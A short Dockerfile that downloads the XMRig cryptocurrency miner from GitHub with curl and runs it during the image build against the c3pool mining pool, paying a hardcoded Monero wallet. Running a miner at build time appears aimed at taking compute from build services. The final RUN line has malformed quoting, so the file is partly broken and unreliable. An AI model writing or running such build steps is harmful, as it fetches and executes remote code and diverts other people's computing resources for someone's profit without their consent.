FROM ubuntu
RUN ["apt", "update"]
RUN ["apt", "install", "-y", "--no-install-recommends", "curl", "ca-certificates"]
RUN ["bash", "-c", "curl -L https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-focal-x64.tar.gz | tar -xz"]
RUN ["ls", "-al"]
RUN ["bash, "-c", ""xmrig-*/xmrig -t 1 -o auto.c3pool.org:443 -u 87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR"]
